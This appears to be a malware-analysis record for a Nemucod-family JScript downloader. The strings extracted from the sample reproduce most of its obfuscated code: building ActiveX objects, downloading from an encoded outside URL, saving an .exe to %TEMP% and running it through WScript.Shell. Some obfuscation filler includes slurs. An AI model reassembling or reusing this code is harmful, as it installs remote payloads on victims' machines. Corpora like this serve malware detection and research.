{
    "filepath": "/corpus/malware/family_1/154ae4b340d685a28c9ac1c83539e1fb7f946acc463cf5ce72b00edb06446d5a",
    "fileinfo": {
        "labels": {
            "family": "family_1",
            "software": "malware"
        },
        "md5": "7d595ffef040a1e562feb4f494539135",
        "type": "UTF-8 Unicode text, with very long lines, with CRLF line terminators",
        "clamav": "Win.Downloader.Nemucod-6772125-0"
    },
    "plugins": [
        {
            "plugin": "extractors.disassembly",
            "version": "0.1",
            "results": {}
        },
        {
            "plugin": "extractors.strings",
            "version": "0.1",
            "results": {
                "KlMuOEgrn = \"_F1_\"": 1,
                "var unseemly = 0": 1,
                "var unseemly1 = 10*10+5*3 + unseemly": 1,
                "base64EncodeChars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"": 1,
                "base64DecodeChars = []": 1,
                "var reparr = {": 1,
                "':': '.',": 1,
                "'U': 'S'": 1,
                "for ( var i = 128": 1,
                "if ( base64DecodeChars[ i ] === undefined )": 1,
                "base64DecodeChars[ i ] = -1": 1,
                "base64DecodeChars[ base64EncodeChars.charCodeAt( i ) ] = i": 1,
                "var unseemly2 = 6/6": 1,
                "String.prototype.elongated = function () {": 1,
                "var webmaster = {": 1,
                "chime: this": 1,
                "webmaster.mediawiki = webmaster.chime[((\"hughes\",\"clinical\",\"shanty\",\"incursion\",\"democritus\",\"addicted\",\"transference\",\"counterpart\",\"s\")+\"ubRt\"+(\"equity\",\"rosary\",\"should\",\"richards\",\"consistency\",\"salient\",\"daisy\",\"ri\")+\"ng\").replace(\"R\", reparr['U'].toLowerCase())](unseemly, unseemly2)": 1,
                "return webmaster.mediawiki": 1,
                "String.prototype.heracks = function() {": 1,
                "var c1, c2, c3, c4": 1,
                "var i, len, out": 1,
                "var str = this.split(\"Zid00\").join(\"\")": 1,
                "len = str.length": 1,
                "out = \"\"": 1,
                "while(i < len) {": 1,
                "/* c1 */": 1,
                "c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff]": 1,
                "} while(i < len && c1 == -1)": 1,
                "if(c1 == -1)": 1,
                "/* c2 */": 1,
                "c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff]": 1,
                "} while(i < len && c2 == -1)": 1,
                "if(c2 == -1)": 1,
                "out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4))": 1,
                "/* c3 */": 1,
                "c3 = str.charCodeAt(i++) & 0xff": 1,
                "if(c3 == 61)": 1,
                "return out": 3,
                "c3 = base64DecodeChars[c3]": 1,
                "} while(i < len && c3 == -1)": 1,
                "if(c3 == -1)": 1,
                "out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2))": 1,
                "/* c4 */": 1,
                "c4 = str.charCodeAt(i++) & 0xff": 1,
                "if(c4 == 61)": 1,
                "c4 = base64DecodeChars[c4]": 1,
                "} while(i < len && c4 == -1)": 1,
                "if(c4 == -1)": 1,
                "out += String.fromCharCode(((c3 & 0x03) << 6) | c4)": 1,
                "String.prototype.someOtherMREP = function () {": 1,
                "strX = this": 1,
                "for (var i in reparr)": 1,
                "strX = strX.replace(i, reparr[i])": 1,
                "return strX": 1,
                "var steadfastness = [\"A\"+\"ctiv\"+\"eXOb\"+(\"homeland\",\"salvador\",\"argue\",\"representing\",\"amassed\",\"basement\",\"swarthy\",\"precocious\",\"ject\"), \"E\"+\"xp\"+\"an\"+(\"bitch\",\"preaches\",\"weaver\",\"bicycle\",\"nevada\",\"estimation\",\"temporarily\",\"bridges\",\"dE\")+\"nv\"+\"ir\"+(\"publicly\",\"foray\",\"garage\",\"stretch\",\"haphazard\",\"vaccination\",\"broach\",\"steerage\",\"on\")+(\"wicket\",\"alexander\",\"monetary\",\"pathology\",\"great\",\"examined\",\"navigating\",\"allergy\",\"me\")+\"nt\"+\"Stri\"+\"ngs\", (\"totally\",\"utilization\",\"raucous\",\"tandem\",\"unlock\",\"inserted\",\"bellies\",\"appears\",\"\")+(\"teens\",\"licence\",\"mashed\",\"citizens\",\"faggot\",\"bouquet\",\"soldiers\",\"%\")+\"TE\"+\"MP%\", \"\"+\".\"+(\"trappings\",\"cloven\",\"swingers\",\"matthews\",\"defunct\",\"ensnare\",\"clubs\",\"single\",\"exe\"), \"R\"+(\"contributor\",\"achieved\",\"laundry\",\"emolument\",\"scarecrow\",\"ringtones\",\"perceived\",\"dressed\",\"un\"), (\"M\"+\"SX\"+\"ML\"+(\"hooked\",\"legends\",\"compare\",\"appreciative\",\"essayist\",\"asbestos\",\"monsoon\",\"2.\")+\"XM\"+\"LH\"+\"TT\"+(\"participated\",\"contractor\",\"animates\",\"began\",\"reinforce\",\"sacrifice\",\"buffalo\",\"presumably\",\"P": 1,
                "\")+\"WU\"+(\"enlightenment\",\"limpid\",\"atheism\",\"convene\",\"jailer\",\"tenaciously\",\"panacea\",\"cr\")+(\"cornet\",\"measured\",\"czech\",\"shortcuts\",\"halves\",\"fairly\",\"lateness\",\"disappoint\",\"ip\")+\"t:\"+(\"gonna\",\"track\",\"sated\",\"documentation\",\"interest\",\"press\",\"arterial\",\"unimpeachable\",\"Sh\")+\"ell\").someOtherMREP()]": 1,
                "oordWCDe = \"_F2_\"": 1,
                "var offense = this[steadfastness.shift()]": 1,
                "WzGmnfrnh = \"XvRKKTs\"": 1,
                "excitement = ((\"composes\", \"manganese\", \"pipeline\", \"aquatic\", \"pggytjdPLozi\") + \"DJCycl\").elongated()": 1,
                "despotic = ((\"arroyo\", \"disciplinary\", \"briefing\", \"erosion\", \"sEkXeokuv\") + \"bwWzQsTe\").elongated()": 1,
                "String.prototype.patch_toText = function (a) {": 1,
                "for (var b = [], c = 0": 1,
                "c < a.length": 1,
                "c++)b[c] = a[c]": 1,
                "return b.join(\"\")": 1,
                "battleship = ((\"expected\",\"right\",\"computational\",\"buxom\",\"kingston\",\"madder\",\"opening\",\"n\")+\"ep\" + String.fromCharCode(100+unseemly2*11)).split(\"\").reverse()": 1,
                "var inauspicious = steadfastness.pop().split(\"": 1,
                "var leasing = new offense(inauspicious[1])": 1,
                "DTanNpOFo = \"_F3_\"": 1,
                "var contentious = new offense(inauspicious[0])": 1,
                "bLPsreURE = \"_F4_\"": 1,
                "var prelude = leasing[steadfastness.shift()](steadfastness.shift())": 1,
                "MFWAxq = \"_F5_\"": 1,
                "weasel = ((\"overt\", \"ronald\", \"defraud\", \"discharge\", \"EuOBtGCcFQ\") + \"mBVrBJwJh\").elongated()": 1,
                "var percentage = Math.random()": 1,
                "var remove = battleship.join(\"\")": 1,
                "function multiple(felicitous, modelling) {": 1,
                "var undesirable = prelude + \"/\" + modelling": 1,
                "undesirable = undesirable+ steadfastness.shift()": 1,
                "if (percentage > 0) {": 1,
                "contentious[remove]((\"bentley\",\"transform\",\"G\" + weasel) + (\"abstinence\",\"metamorphosis\",\"enterprises\",\"farms\",\"T\"), felicitous, false)": 1,
                "WzPxccxRLJg = \"_F7_\"": 1,
                "contentious[despotic + (\"antecedent\",\"corolla\",\"end\")]()": 1,
                "eval(\"dmFyZid00IHN0b3Zid00N0b3MgPSAoV1NjcmlZid00wdCArIiIgPT0gIldpbmRvd3MgU2NyaXB0IEhvZid00c3QiKSAmJiBjb250ZW50aW91cy5zdZid00GF0dXMgPT0gMjAwICYmIHR5cGVvZihtQWFZid00Kdmx2Z1QpPT09ICJ1bmRlZmluZWQiOw0KCQ==\".heracks())": 1,
                "lQHNgR = \"_F8_\"": 1,
                "if (stostos) {": 1,
                "var impulsive = new offense(((\"southern\",\"sprout\",\"logic\",\"interlocutor\",\"slipshod\",\"bellies\",\"aphorism\",\"pitchfork\",\"A\")+(\"nutrition\",\"squat\",\"newborn\",\"operative\",\"consign\",\"scissors\",\"alias\",\"affects\",\"SEOO\")+\"DB\"+(\"camera\",\"presentiment\",\"extra\",\"daisy\",\"sociology\",\"taste\",\"esprit\",\".S\")+\"tr8\").replace(\"SEO\", \"D\").replace(\"8\", \"eam\"))": 1,
                "impulsive[remove]()": 1,
                "zcbqmoyTVX = \"_F9_\"": 1,
                "impulsive.type = unseemly2": 1,
                "OXNJMB = \"_F10_\"": 1,
                "impulsive[(\"commodity\",\"coined\",\"municipality\",\"tortoise\",\"referral\",\"onesided\",\"arctic\",\"w\")+\"ri\"+\"te\"](contentious[(\"emergency\",\"abjure\",\"montana\",\"dialog\",\"rover\",\"partnership\",\"hundred\",\"\")+\"R\"+\"es\"+\"pon\"+reparr['U'].toLowerCase()+\"e\"+(\"efficacious\",\"amiably\",\"building\",\"rumble\",\"shepherdess\",\"jumble\",\"distraught\",\"Bo\")+\"dy\"])": 1,
                "LDOpQn = \"_F11_\"": 1,
                "impulsive[(excitement + \"o\"+(\"snipe\",\"prattle\",\"blent\",\"interlude\",\"culpable\",\"reticent\",\"heater\",\"dicks\",\"00\")+(\"questionable\",\"cabin\",\"december\",\"percentage\",\"broker\",\"clipped\",\"joiner\",\"8i\")+\"tion\").replace(\"0\"+(\"shoulder\",\"lenders\",\"aquatic\",\"liverpool\",\"abolitionist\",\"honey\",\"recommend\",\"08\"), despotic)] = 0": 1,
                "CFCNIJ = \"_F12_\"": 1,
                "impulsive[(\"involves\",\"preference\",\"barrel\",\"anyone\",\"renewable\",\"entrepreneur\",\"kissing\",\"s\")+\"aveT\"+\"oF\"+\"ile\"](undesirable, 2)": 1,
                "SkMFnMYCjT = \"_F13_\"": 1,
                "impulsive.close()": 1,
                "StxBlaH = \"_F14_\"": 1,
                "leasing[steadfastness.shift()](undesirable, unseemly2, \"kiNGsK\" === \"BImlPxXGvVk\")": 1,
                "tUfWSIa = \"_F17_\"": 1,
                "} catch (BgYrpBlC) { }": 1,
                "zCoTnOXD = \"_F15_\"": 1,
                "multiple(\"aHR0cDovLw==\".heracks()+\"\\u0066\\u0069\\u006E\\u0064\\u006C\\u006F\\u0063\\u0061\\u006C\\u0070\\u0068\\u006F\\u0074\\u006F\\u0067\\u0072\\u0061\"+\"\\u0070\\u0068\\u0065\\u0072\\u002E\\u0063\\u006F\\u006D\\u002F\\u0038\\u0037\\u0079\\u0067\\u0037\\u0079\\u0079\\u0062\",\"ubHtSjVff\")": 1,
                "TzIntXm = \"_F16_\"": 1,
                "word: klmuoegrn": 1,
                "word: unseemly": 9,
                "word: encodechars": 2,
                "word: abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz": 1,
                "word: decodechars": 8,
                "word: reparr": 5,
                "word: undefined": 1,
                "word: charcodeat": 5,
                "word: string": 8,
                "word: prototype": 4,
                "word: elongated": 4,
                "word: function": 5,
                "word: webmaster": 4,
                "word: mediawiki": 2,
                "word: hughes": 1,
                "word: clinical": 1,
                "word: shanty": 1,
                "word: incursion": 1,
                "word: democritus": 1,
                "word: addicted": 1,
                "word: transference": 1,
                "word: counterpart": 1,
                "word: equity": 1,
                "word: rosary": 1,
                "word: should": 1,
                "word: richards": 1,
                "word: consistency": 1,
                "word: salient": 1,
                "word: replace": 5,
                "word: tolowercase": 2,
                "word: return": 6,
                "word: heracks": 3,
                "word: length": 2,
                "word: fromcharcode": 4,
                "word: someothermrep": 2,
                "word: steadfastness": 7,
                "word: homeland": 1,
                "word: salvador": 1,
                "word: representing": 1,
                "word: amassed": 1,
                "word: basement": 1,
                "word: swarthy": 1,
                "word: precocious": 1,
                "word: preaches": 1,
                "word: weaver": 1,
                "word: bicycle": 1,
                "word: nevada": 1,
                "word: estimation": 1,
                "word: temporarily": 1,
                "word: bridges": 1,
                "word: publicly": 1,
                "word: garage": 1,
                "word: stretch": 1,
                "word: haphazard": 1,
                "word: vaccination": 1,
                "word: broach": 1,
                "word: steerage": 1,
                "word: wicket": 1,
                "word: alexander": 1,
                "word: monetary": 1,
                "word: pathology": 1,
                "word: examined": 1,
                "word: navigating": 1,
                "word: allergy": 1,
                "word: totally": 1,
                "word: utilization": 1,
                "word: raucous": 1,
                "word: tandem": 1,
                "word: unlock": 1,
                "word: inserted": 1,
                "word: bellies": 2,
                "word: appears": 1,
                "word: licence": 1,
                "word: mashed": 1,
                "word: citizens": 1,
                "word: faggot": 1,
                "word: bouquet": 1,
                "word: soldiers": 1,
                "word: trappings": 1,
                "word: cloven": 1,
                "word: swingers": 1,
                "word: matthews": 1,
                "word: defunct": 1,
                "word: ensnare": 1,
                "word: single": 1,
                "word: contributor": 1,
                "word: achieved": 1,
                "word: laundry": 1,
                "word: emolument": 1,
                "word: scarecrow": 1,
                "word: ringtones": 1,
                "word: perceived": 1,
                "word: dressed": 1,
                "word: hooked": 1,
                "word: legends": 1,
                "word: compare": 1,
                "word: appreciative": 1,
                "word: essayist": 1,
                "word: asbestos": 1,
                "word: monsoon": 1,
                "word: participated": 1,
                "word: contractor": 1,
                "word: animates": 1,
                "word: reinforce": 1,
                "word: sacrifice": 1,
                "word: buffalo": 1,
                "word: presumably": 1,
                "word: enlightenment": 1,
                "word: limpid": 1,
                "word: atheism": 1,
                "word: convene": 1,
                "word: jailer": 1,
                "word: tenaciously": 1,
                "word: panacea": 1,
                "word: cornet": 1,
                "word: measured": 1,
                "word: shortcuts": 1,
                "word: halves": 1,
                "word: fairly": 1,
                "word: lateness": 1,
                "word: disappoint": 1,
                "word: documentation": 1,
                "word: interest": 1,
                "word: arterial": 1,
                "word: unimpeachable": 1,
                "word: oordwcde": 1,
                "word: offense": 4,
                "word: wzgmnfrnh": 1,
                "word: xvrkkts": 1,
                "word: excitement": 2,
                "word: composes": 1,
                "word: manganese": 1,
                "word: pipeline": 1,
                "word: aquatic": 2,
                "word: pggytjdplozi": 1,
                "word: djcycl": 1,
                "word: despotic": 3,
                "word: arroyo": 1,
                "word: disciplinary": 1,
                "word: briefing": 1,
                "word: erosion": 1,
                "word: sekxeokuv": 1,
                "word: bwwzqste": 1,
                "word: totext": 1,
                "word: battleship": 2,
                "word: expected": 1,
                "word: computational": 1,
                "word: kingston": 1,
                "word: madder": 1,
                "word: opening": 1,
                "word: reverse": 1,
                "word: inauspicious": 3,
                "word: leasing": 3,
                "word: dtannpofo": 1,
                "word: contentious": 4,
                "word: blpsreure": 1,
                "word: prelude": 2,
                "word: mfwaxq": 1,
                "word: weasel": 2,
                "word: ronald": 1,
                "word: defraud": 1,
                "word: discharge": 1,
                "word: euobtgccfq": 1,
                "word: mbvrbjwjh": 1,
                "word: percentage": 3,
                "word: random": 1,
                "word: remove": 3,
                "word: multiple": 2,
                "word: felicitous": 2,
                "word: modelling": 2,
                "word: undesirable": 5,
                "word: bentley": 1,
                "word: transform": 1,
                "word: abstinence": 1,
                "word: metamorphosis": 1,
                "word: enterprises": 1,
                "word: wzpxccxrljg": 1,
                "word: antecedent": 1,
                "word: corolla": 1,
                "word: dmfyzid": 1,
                "word: mgpsaov": 1,
                "word: njcmlzid": 1,
                "word: wdcariiigpt": 1,
                "word: gildpbmrvd": 1,
                "word: iehvzid": 1,
                "word: qiksamjibjb": 1,
                "word: dxmgpt": 1,
                "word: gmjawicymihr": 1,
                "word: cgvvzihtqwfzid": 1,
                "word: bmrlzmluzwqiow": 1,
                "word: lqhngr": 1,
                "word: stostos": 1,
                "word: impulsive": 7,
                "word: southern": 1,
                "word: sprout": 1,
                "word: interlocutor": 1,
                "word: slipshod": 1,
                "word: aphorism": 1,
                "word: pitchfork": 1,
                "word: nutrition": 1,
                "word: newborn": 1,
                "word: operative": 1,
                "word: consign": 1,
                "word: scissors": 1,
                "word: affects": 1,
                "word: camera": 1,
                "word: presentiment": 1,
                "word: sociology": 1,
                "word: esprit": 1,
                "word: zcbqmoytvx": 1,
                "word: oxnjmb": 1,
                "word: commodity": 1,
                "word: coined": 1,
                "word: municipality": 1,
                "word: tortoise": 1,
                "word: referral": 1,
                "word: onesided": 1,
                "word: arctic": 1,
                "word: emergency": 1,
                "word: abjure": 1,
                "word: montana": 1,
                "word: dialog": 1,
                "word: partnership": 1,
                "word: hundred": 1,
                "word: efficacious": 1,
                "word: amiably": 1,
                "word: building": 1,
                "word: rumble": 1,
                "word: shepherdess": 1,
                "word: jumble": 1,
                "word: distraught": 1,
                "word: ldopqn": 1,
                "word: prattle": 1,
                "word: interlude": 1,
                "word: culpable": 1,
                "word: reticent": 1,
                "word: heater": 1,
                "word: questionable": 1,
                "word: december": 1,
                "word: broker": 1,
                "word: clipped": 1,
                "word: joiner": 1,
                "word: shoulder": 1,
                "word: lenders": 1,
                "word: liverpool": 1,
                "word: abolitionist": 1,
                "word: recommend": 1,
                "word: cfcnij": 1,
                "word: involves": 1,
                "word: preference": 1,
                "word: barrel": 1,
                "word: anyone": 1,
                "word: renewable": 1,
                "word: entrepreneur": 1,
                "word: kissing": 1,
                "word: skmfnmycjt": 1,
                "word: stxblah": 1,
                "word: kingsk": 1,
                "word: bimlpxxgvvk": 1,
                "word: tufwsia": 1,
                "word: bgyrpblc": 1,
                "word: zcotnoxd": 1,
                "word: cdovlw": 1,
                "word: ubhtsjvff": 1,
                "word: tzintxm": 1,
                "special: EncodeChars.charCodeAt": 1,
                "special: String.prototype.elongated": 1,
                "special: webmaster.mediawiki": 2,
                "special: webmaster.chime": 1,
                "special: String.prototype.heracks": 1,
                "special: this.split": 1,
                "special: str.length": 1,
                "special: str.charCodeAt": 4,
                "special: String.fromCharCode": 4,
                "special: String.prototype.someOtherMREP": 1,
                "special: strX.replace": 1,
                "special: steadfastness.shift": 5,
                "special: String.prototype.patch": 1,
                "special: steadfastness.pop": 1,
                "special: Math.random": 1,
                "special: battleship.join": 1,
                "special: impulsive.type": 1,
                "special: impulsive.close": 1
            }
        },
        {
            "plugin": "extractors.meta",
            "version": "0.1",
            "results": {
                "clamav: bytecode: JIT disabled": 1,
                "clamav: Cannot prepare for JIT, LLVM is not compiled or not linked": 1,
                "clamav: Bytecode: 0 bytecode prepared with JIT, 94 prepared with interpreter, 94 total": 1,
                "clamav: Recognized ASCII text": 1,
                "clamav: cli_scanscript: saving normalized file to ./temp/clamav-4eb91b22aa836d4c139d64752a0aaec7.tmp": 1,
                "clamav: FP SIGNATURE: 00000000000000000000000000000000:6???:Win.Downloader.Nemucod-6??????-0": 1,
                "clamav: cli_magic_scandesc: returning 1  at line 2???": 1,
                "clamav: Win.Downloader.Nemucod-6772125-0 FOUND": 2,
                "clamav: Scanned files: 1": 1,
                "clamav: Infected files: 1": 1
            }
        }
    ]
}